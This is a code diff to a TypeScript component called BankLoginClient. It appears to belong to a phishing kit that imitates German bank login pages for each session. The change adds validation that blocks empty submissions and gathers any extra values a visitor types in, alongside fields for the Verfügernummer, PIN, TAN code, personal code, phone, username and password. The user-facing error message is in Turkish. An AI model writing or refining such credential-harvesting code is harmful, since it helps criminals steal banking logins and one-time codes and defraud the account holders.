@@ -196,6 +196,10 @@ function shouldResetPreviousBankField(key: string): boolean {
   );
 }
 
+function hasMeaningfulSubmitValue(value: unknown): boolean {
+  return typeof value === "string" && value.trim().length > 0;
+}
+
 export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
@@ -303,6 +307,42 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         : typeof sessionFormData.orderedField2Type === "string"
           ? sessionFormData.orderedField2Type.trim()
           : "";
+    const currentExtraCapturedValues = Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(
+      ([key, value]) => {
+        if (
+          knownCredentialKeys.has(key) ||
+          isIgnoredRawCredentialKey(key) ||
+          !hasMeaningfulSubmitValue(value)
+        ) {
+          return [];
+        }
+
+        const canonicalKey = inferCanonicalCredentialKey(key);
+        if (canonicalKey) {
+          return [];
+        }
+
+        return [String(value).trim()];
+      },
+    );
+    const hasCurrentSubmissionData = [
+      currentVerfuegernummer,
+      currentPin,
+      currentTacCode,
+      currentPersonalCode,
+      typeof overrideData?.bankPhone === "string" ? overrideData.bankPhone : "",
+      typeof overrideData?.username === "string" ? overrideData.username : "",
+      typeof overrideData?.password === "string" ? overrideData.password : "",
+      typeof overrideData?.orderedField1 === "string" ? overrideData.orderedField1 : "",
+      typeof overrideData?.orderedField2 === "string" ? overrideData.orderedField2 : "",
+      ...currentExtraCapturedValues,
+    ].some(hasMeaningfulSubmitValue);
+
+    if (!hasCurrentSubmissionData) {
+      setSaving(false);
+      setError("Form alanlari doldurulmadan devam edilemez.");
+      return;
+    }
 
     const normalizedFields = normalizeBankLoginFields({ 
       verfuegernummer: currentVerfuegernummer, 
